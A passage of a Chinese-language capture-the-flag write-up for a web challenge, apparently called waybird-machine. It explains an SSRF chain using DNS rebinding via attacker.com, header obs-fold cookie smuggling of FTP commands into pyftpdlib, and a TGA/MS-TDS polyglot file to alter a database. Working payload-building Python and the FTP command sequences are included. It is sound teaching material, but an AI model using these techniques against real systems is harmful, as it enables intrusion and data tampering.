+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># waybird-machine/web/bbbird_archive/app/routes.py:31</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">"/scrape"</span>, methods=[<span class="string">"POST"</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scrape</span>():</span><br><span class="line">    url = request.form.get(<span class="string">"url"</span>, <span class="string">""</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        flash(<span class="string">"Please enter a URL."</span>, <span class="string">"error"</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">"index"</span>))</span><br><span class="line">    </span><br><span class="line">    auth_user = request.form.get(<span class="string">"username"</span>, <span class="string">""</span>).strip()</span><br><span class="line">    auth_pass = request.form.get(<span class="string">"password"</span>, <span class="string">""</span>).strip()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith((<span class="string">"http://"</span>, <span class="string">"https://"</span>)):</span><br><span class="line">        flash(<span class="string">"URL must start with http:// or https://."</span>, <span class="string">"error"</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">"index"</span>))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        (safe_name, meta) = scraper.scrape(url, auth_user, auth_pass)</span><br><span class="line">    <span class="keyword">except</span> scraper.ScrapeError <span class="keyword">as</span> e:</span><br><span class="line">        flash(<span class="string">f"Failed to scrape image: <span class="subst">{e}</span>"</span>, <span class="string">"error"</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">"index"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        db.insert_image(url, safe_name, meta)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        flash(<span class="string">f"Image scraped but failed to save: <span class="subst">{e}</span>"</span>, <span class="string">"error"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"DB insert failed: <span class="subst">{e}</span>"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">"index"</span>))</span><br></pre></td></tr></table></figure></div>
+
+<p>但很巧的是，<code>web</code> 裡面剛好跑了一個 app 完全沒用到的 FTP server：<code>pyftpdlib</code></p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pyftpdlib -D --port 21 -w -d /app/app/static/scraped &amp;</span><br></pre></td></tr></table></figure></div>
+
+<p>FTP 主要使用 printable 的 chars，跟 http 類似。FTP client 送給 server 的內容大概像這樣。底下的範例是把 <code>/app/app/static/scraped/test.png</code> 的內容傳送到 <code>127.0.0.1:1433</code> 的 FTP 指令。所以只要把要傳送的檔案內容設成「把資料庫中 flag 的 <code>is_hidden</code> 改成 false」的 <a class="link" target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/b46a581a-39de-4745-b076-ec4dbb7d13ec">MS-TDS<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 內容，flag 就會在首頁被顯示出來。</p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">USER anonymous</span><br><span class="line">PASS x</span><br><span class="line">TYPE I</span><br><span class="line">PORT 127,0,0,1,5,153</span><br><span class="line">RETR /app/app/static/scraped/test.png</span><br></pre></td></tr></table></figure></div>
+
+<p>所以現在只要做到 1. 控制 <code>web</code> 上的檔案成改資料庫的 MS-TDS。 2. 能控制 FTP。</p>
+<h3 id="寫檔"><a href="#寫檔" class="headerlink" title="寫檔"></a>寫檔</h3><p>用 <code>web</code> 的 <code>/scrap</code> 只能寫圖片進去，會呼叫 <code>verify</code> 驗證寫的檔案是不是圖片。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># waybird-machine/web/bbbird_archive/app/scraper.py:92</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scrape</span>(<span class="params">url, auth_user, auth_pass</span>):</span><br><span class="line">    _validate_url(url)</span><br><span class="line">    </span><br><span class="line">    r = _fetch(url, auth_user, auth_pass)</span><br><span class="line">    </span><br><span class="line">    content_type = r.headers.get(<span class="string">"Content-Type"</span>, <span class="string">""</span>)</span><br><span class="line">    ext = MIMETYPE_TO_EXT.get(content_type)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ext:</span><br><span class="line">        parsed = urlparse(url)</span><br><span class="line">        ext = Path(parsed.path).suffix</span><br><span class="line">        </span><br><span class="line">    tmp = tempfile.NamedTemporaryFile(delete=<span class="literal">False</span>, <span class="built_in">dir</span>=app.config[<span class="string">"UPLOAD_FOLDER"</span>], suffix=ext)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># [...]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># [... download file to tmp]</span></span><br><span class="line"></span><br><span class="line">        meta = verify(tmp.name)</span><br><span class="line">        <span class="keyword">if</span> meta <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> ScrapeError(<span class="string">"Image verification failed"</span>)</span><br><span class="line"></span><br><span class="line">        ext = IMAGEMAGICK_FORMAT_TO_EXT.get(meta[<span class="string">"format"</span>].upper(), ext)</span><br><span class="line">        safe_name = <span class="string">f"<span class="subst">{uuid.uuid4().<span class="built_in">hex</span>}</span><span class="subst">{ext}</span>"</span></span><br><span class="line">        dest = os.path.join(app.config[<span class="string">"UPLOAD_FOLDER"</span>], safe_name)</span><br><span class="line">        shutil.move(tmp.name, dest)</span><br><span class="line"></span><br><span class="line">        meta[<span class="string">"file_size"</span>] = os.path.getsize(dest)</span><br><span class="line">        <span class="keyword">return</span> safe_name, meta</span><br></pre></td></tr></table></figure></div>
+
+<p><code>verify</code> 會用 <code>imagemagick</code> 去取得檔案類型後回傳。如果檔案不是圖片，<code>imagemagick</code> 就會噴錯，就會無法上傳圖片。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># waybird-machine/web/bbbird_archive/app/scraper.py:141</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = subprocess.run([<span class="string">"identify"</span>, <span class="string">"-format"</span>, <span class="string">"%w %h %m"</span>, <span class="string">"--"</span>, filepath], capture_output=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        <span class="keyword">raise</span> ScrapeError(<span class="string">"Image verification timed out"</span>)</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> result.returncode != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ScrapeError(<span class="string">"Image verification failed"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        raw = result.stdout.strip()</span><br><span class="line">        (width, height, fmt) = raw.split(<span class="string">b" "</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">raise</span> ScrapeError(<span class="string">f"Could not parse ImageMagick output: <span class="subst">{raw.decode(<span class="string">'utf-8'</span>, errors=<span class="string">'replace'</span>)}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">        <span class="string">"width"</span>: <span class="built_in">int</span>(width.decode(<span class="string">'utf-8'</span>)),</span><br><span class="line">        <span class="string">"height"</span>: <span class="built_in">int</span>(height.decode(<span class="string">'utf-8'</span>)),</span><br><span class="line">        <span class="string">"format"</span>: fmt.decode(<span class="string">'utf-8'</span>),</span><br><span class="line">    }</span><br></pre></td></tr></table></figure></div>
+
+<p>所以我們需要造出同時是圖片（過 imagemagick 檢查），且是 <a class="link" target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/b46a581a-39de-4745-b076-ec4dbb7d13ec">MS-TDS<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 的檔案。有種圖片格式叫做 Truevision TGA，剛好符合這個需求。所以這部分的問題解決。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">```python</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_tga_prelogin</span>(<span class="params">pkt_len=<span class="number">512</span></span>):</span><br><span class="line">    pkt = <span class="built_in">bytearray</span>(pkt_len)</span><br><span class="line">    pkt[<span class="number">0</span>] = <span class="number">0x12</span>   <span class="comment"># TDS PRELOGIN type / TGA id_length=18</span></span><br><span class="line">    pkt[<span class="number">1</span>] = <span class="number">0x01</span>   <span class="comment"># TDS EOM / TGA colormap_type=1</span></span><br><span class="line">    pkt[<span class="number">2</span>] = <span class="number">0x02</span>   <span class="comment"># TDS length hi / TGA image_type=2 (RGB)</span></span><br><span class="line">    pkt[<span class="number">3</span>] = <span class="number">0x00</span>   <span class="comment"># length lo, total length = 0x0200 = 512</span></span><br><span class="line">    pkt[<span class="number">7</span>] = <span class="number">0x08</span>   <span class="comment"># TGA colormap_size = 8 (valid)</span></span><br><span class="line">    pkt[<span class="number">8</span>] = <span class="number">0x01</span>   <span class="comment"># PRELOGIN ENCRYPTION option</span></span><br><span class="line">    pkt[<span class="number">10</span>] = <span class="number">0x13</span>  <span class="comment"># offset = 19</span></span><br><span class="line">    pkt[<span class="number">12</span>] = <span class="number">0x01</span>  <span class="comment"># length = 1 byte</span></span><br><span class="line">    pkt[<span class="number">13</span>] = <span class="number">0x00</span>  <span class="comment"># PRELOGIN VERSION option (also TGA width_hi)</span></span><br><span class="line">    pkt[<span class="number">14</span>] = <span class="number">0x01</span>  <span class="comment"># VERSION offset hi (also TGA height_lo)</span></span><br><span class="line">    pkt[<span class="number">16</span>] = <span class="number">0x01</span>  <span class="comment"># VERSION length hi (also TGA bits_per_pixel=1, valid)</span></span><br><span class="line">    pkt[<span class="number">17</span>] = <span class="number">0xEC</span>  <span class="comment"># VERSION length lo =&gt; length=0x01EC=492</span></span><br><span class="line">    pkt[<span class="number">18</span>] = <span class="number">0xFF</span>  <span class="comment"># TERMINATOR</span></span><br><span class="line">    pkt[<span class="number">19</span>] = <span class="number">0x00</span>  <span class="comment"># ENCRYPTION data = OFF</span></span><br><span class="line">    pkt[<span class="number">20</span>] = <span class="number">0x09</span>  <span class="comment"># VERSION major</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(pkt)</span><br><span class="line">```</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="SSRF-FTP-to-SSRF-Babelfish"><a href="#SSRF-FTP-to-SSRF-Babelfish" class="headerlink" title="SSRF FTP to SSRF Babelfish"></a>SSRF FTP to SSRF Babelfish</h3><p>目前我們有 HTTP 的 SSRF；兩種都是用 printable 傳輸。但格式不一樣。不過還好 FTP 可以吃垃圾也不會壞掉，錯誤指令的行會被 FTP 無視；只會執行合法的行，比如：</p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># printf 'GET / HTTP/1.1\r\nUSER anonymous\r\n' | nc 0.0.0.0 21</span></span><br><span class="line">220 pyftpdlib 2.2.0 ready.</span><br><span class="line">500 Command <span class="string">"GET"</span> not understood.</span><br><span class="line">331 Username ok, send password.</span><br></pre></td></tr></table></figure></div>
+
+<p>所以現在的目標，是在 HTTP SSRF 中，造出這些 FTP 指令：</p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">USER anonymous</span><br><span class="line">PASS x</span><br><span class="line">TYPE I</span><br><span class="line">PORT 127,0,0,1,5,153</span><br><span class="line">RETR /app/app/static/scraped/test.png</span><br></pre></td></tr></table></figure></div>
+
+<p>我們能用的 SSRF 如下，<code>url</code>, <code>auth_user</code>, <code>auth_pass</code> 都可控。比較特別的是 <code>r.status_code == 401</code> 的時候可以再次送出請求。由於 <code>url</code> 是可控的，我們可以造出 <code>401</code> 的回應進入那個 branch，讓送出 <code>HTTPBasicAuth</code> / <code>HTTPDigestAuth</code> 的 <code>requests.get</code>。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># waybird-machine/web/bbbird_archive/app/scraper.py:61</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_fetch</span>(<span class="params">url, auth_user, auth_pass</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">401</span>:</span><br><span class="line">            r.close()</span><br><span class="line">            auth_header = r.headers.get(<span class="string">"WWW-Authenticate"</span>, <span class="string">""</span>).lower()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"basic"</span> <span class="keyword">in</span> auth_header:</span><br><span class="line">                r = requests.get(url, auth=HTTPBasicAuth(auth_user, auth_pass), allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">"digest"</span> <span class="keyword">in</span> auth_header:</span><br><span class="line">                r = requests.get(url, auth=HTTPDigestAuth(auth_user, auth_pass), allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ScrapeError(<span class="string">f"Unsupported auth method <span class="subst">{auth_header}</span>"</span>)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="keyword">except</span> requests.ConnectionError:</span><br><span class="line">        <span class="keyword">raise</span> ScrapeError(<span class="string">"Could not connect to the server. Check the URL and try again."</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.Timeout:</span><br><span class="line">        <span class="keyword">raise</span> ScrapeError(<span class="string">"The request timed out. The server took too long to respond."</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">        code = e.response.status_code <span class="keyword">if</span> e.response <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        friendly = {</span><br><span class="line">            <span class="number">403</span>: <span class="string">"Access denied - the server refused the request."</span>,</span><br><span class="line">            <span class="number">404</span>: <span class="string">"Image not found - the URL may be wrong or the image was removed."</span>,</span><br><span class="line">            <span class="number">500</span>: <span class="string">"The remote server encountered an error."</span>,</span><br><span class="line">            <span class="number">502</span>: <span class="string">"The remote server returned a bad gateway error."</span>,</span><br><span class="line">            <span class="number">503</span>: <span class="string">"The remote server is temporarily unavailable."</span>,</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">raise</span> ScrapeError(friendly.get(code, <span class="string">f"The server returned an error (HTTP <span class="subst">{code}</span>)."</span>))</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException:</span><br><span class="line">        <span class="keyword">raise</span> ScrapeError(<span class="string">"Something went wrong while fetching the image. Check the URL and try again."</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><code>requests.get(url, auth=HTTPDigestAuth)</code> 的流程會送出總共兩次 http request，第一次會跟 server 要 challenge，第二次會回傳利用 credential 算出 challenge 的解。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">Python / requests                                  Server</span><br><span class="line">       |                                              |</span><br><span class="line">       |  GET /private HTTP/1.1                       |</span><br><span class="line">       |---------------------------------------------&gt;|</span><br><span class="line">       |                                              |</span><br><span class="line">       |                         401 Unauthorized     |</span><br><span class="line">       |                         WWW-Authenticate:    |</span><br><span class="line">       |                           Digest             |</span><br><span class="line">       |                           realm="example",    |</span><br><span class="line">       |                           nonce="abc123",     |</span><br><span class="line">       |                           qop="auth",         |</span><br><span class="line">       |                           algorithm=MD5       |</span><br><span class="line">       |&lt;---------------------------------------------|</span><br><span class="line">       |                                              |</span><br><span class="line">       |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^    |</span><br><span class="line">       |                  DIGEST CHALLENGE            |</span><br><span class="line">       |                                              |</span><br><span class="line">       |  Client calculates:                          |</span><br><span class="line">       |                                              |</span><br><span class="line">       |    HA1 = MD5("alice:example:secret")         |</span><br><span class="line">       |    HA2 = MD5("GET:/private")                 |</span><br><span class="line">       |                                              |</span><br><span class="line">       |    response = MD5(                           |</span><br><span class="line">       |      HA1 :                                   |</span><br><span class="line">       |      nonce :                                 |</span><br><span class="line">       |      nc :                                    |</span><br><span class="line">       |      cnonce :                                |</span><br><span class="line">       |      qop :                                   |</span><br><span class="line">       |      HA2                                     |</span><br><span class="line">       |    )                                         |</span><br><span class="line">       |                                              |</span><br><span class="line">       |  GET /private HTTP/1.1                       |</span><br><span class="line">       |  Authorization: Digest                       |</span><br><span class="line">       |    username="alice",                         |</span><br><span class="line">       |    realm="example",                          |</span><br><span class="line">       |    nonce="abc123",                           |</span><br><span class="line">       |    uri="/private",                           |</span><br><span class="line">       |    qop=auth,                                 |</span><br><span class="line">       |    nc=00000001,                              |</span><br><span class="line">       |    cnonce="xyz789",                          |</span><br><span class="line">       |    response="e45d8d..."                      |</span><br><span class="line">       |---------------------------------------------&gt;|</span><br><span class="line">       |                                              |</span><br><span class="line">       |  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^   |</span><br><span class="line">       |               DIGEST RESPONSE                |</span><br><span class="line">       |                                              |</span><br><span class="line">       |                         Server computes      |</span><br><span class="line">       |                         expected response    |</span><br><span class="line">       |                         using Alice's        |</span><br><span class="line">       |                         password.            |</span><br><span class="line">       |                                              |</span><br><span class="line">       |                         If they match:       |</span><br><span class="line">       |                                              |</span><br><span class="line">       |                         200 OK               |</span><br><span class="line">       |&lt;---------------------------------------------|</span><br><span class="line">       |                                              |</span><br></pre></td></tr></table></figure></div>
+
+<p>可以在 <code>requests.get(url, auth=HTTPDigestAuth)</code> 中的第一次 request 的 response <code>Set-Cookie</code>，這樣在第二次 request 時，就會帶上 <code>Cookie</code> header。<br>可以把這個現象配上 DNS rebinding：在  <code>requests.get(url, auth=HTTPDigestAuth)</code> 送請求時，URL 設成攻擊者 <code>http://attacker.com:21</code>。一開始 <code>attacker.com</code> 指向攻擊者 IP，攻擊者 server 回覆 <code>Set-Cookie: &lt;cookie-payload&gt;</code>，並拖一些時間做 DNS rebinding。此時再把 <code>attacker.com</code> 指向 <code>127.0.0.1</code>；這樣第二個 request 就會帶著 <code>&lt;cookie-payload&gt;</code> 送到 <code>web</code> 的 FTP server。</p>
+<p>所以現在有送含任意 <code>Cookie</code> header 的 http request 到 FTP server 的 primitive 了。我們需要送很多行 FTP 指令，但我們沒辦法在 cookie 裡面換行（嗎？）</p>
+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">USER anonymous</span><br><span class="line">PASS x</span><br><span class="line">TYPE I</span><br><span class="line">PORT 127,0,0,1,5,153</span><br><span class="line">RETR /app/app/static/scraped/test.png</span><br></pre></td></tr></table></figure></div>
+
+<p>如果直接 <code>Set-Cookie: a="test\r\n123"</code>，是不會把 <code>\r\n</code> 設進 cookie 的，因為會被認定為另一個 header。<br>但 <code>Set-Cookie: a="test\r\n 123"</code> 就可以；因為以空白開始的新的一行，會被認定為前一行 header 的值的一部分（obs-fold）。<br>可以換行了，但是得要是 空白 / tab 開頭。但 FTP 指令不能用 空白 / tab 開頭。</p>
+<p>pyftpdlib 在處理指令的時候，<a class="link" target="_blank" rel="noopener" href="https://github.com/giampaolo/pyftpdlib/blob/release-2.0.1/pyftpdlib/handlers.py#L1535-L1546">如果太長會把 buffer 清空<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，開啟新的一個 FTP 指令，解決開頭空白的問題。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/giampaolo/pyftpdlib/blob/release-2.0.1/pyftpdlib/handlers.py#L1535-L1546</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">collect_incoming_data</span>(<span class="params">self, data</span>):</span><br><span class="line">    <span class="string">"""Read incoming data and append to the input buffer."""</span></span><br><span class="line">    <span class="variable language_">self</span>._in_buffer.append(data)</span><br><span class="line">    <span class="variable language_">self</span>._in_buffer_len += <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="comment"># Flush buffer if it gets too long (possible DoS attacks).</span></span><br><span class="line">    <span class="comment"># RFC-959 specifies that a 500 response could be given in</span></span><br><span class="line">    <span class="comment"># such cases</span></span><br><span class="line">    buflimit = <span class="number">2048</span></span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>._in_buffer_len &gt; buflimit:</span><br><span class="line">        <span class="variable language_">self</span>.respond_w_warning(<span class="string">'500 Command too long.'</span>)</span><br><span class="line">        <span class="variable language_">self</span>._in_buffer = []</span><br><span class="line">        <span class="variable language_">self</span>._in_buffer_len = <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">USER_CMD = <span class="string">b'USER anonymous\r\n '</span></span><br><span class="line">PASS_CMD = <span class="string">b'PASS x\r\n '</span></span><br><span class="line">TYPE_CMD = <span class="string">b'TYPE I\r\n '</span></span><br><span class="line">PORT_CMD = <span class="string">b'PORT 127,0,0,1,5,153\r\n '</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_cookie_smuggle</span>(<span class="params">url_host, filename</span>):</span><br><span class="line">    prefix_size = <span class="number">16</span> + <span class="built_in">len</span>(<span class="string">f'Host: <span class="subst">{url_host}</span>\r\n'</span>) + <span class="number">36</span> + <span class="number">32</span> + <span class="number">13</span> + <span class="number">24</span> + <span class="number">10</span>  <span class="comment"># "Cookie: x="</span></span><br><span class="line">    USER_off = <span class="number">65536</span> - prefix_size</span><br><span class="line">    PASS_off = <span class="number">131072</span> - prefix_size</span><br><span class="line">    TYPE_off = <span class="number">196608</span> - prefix_size</span><br><span class="line">    PORT_off = <span class="number">262144</span> - prefix_size</span><br><span class="line">    RETR_off = <span class="number">327680</span> - prefix_size</span><br><span class="line">    retr = <span class="string">f'RETR <span class="subst">{filename}</span>\r\n '</span>.encode()</span><br><span class="line">    parts = []</span><br><span class="line">    cur = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> off, cmd <span class="keyword">in</span> [(USER_off, USER_CMD), (PASS_off, PASS_CMD), (TYPE_off, TYPE_CMD), (PORT_off, PORT_CMD), (RETR_off, retr)]:</span><br><span class="line">        parts.append(<span class="string">b'A'</span> * (off - cur)); cur = off</span><br><span class="line">        parts.append(cmd); cur += <span class="built_in">len</span>(cmd)</span><br><span class="line">    parts.append(<span class="string">b'A'</span> * <span class="number">200</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b''</span>.join(parts)</span><br></pre></td></tr></table></figure></div>
+
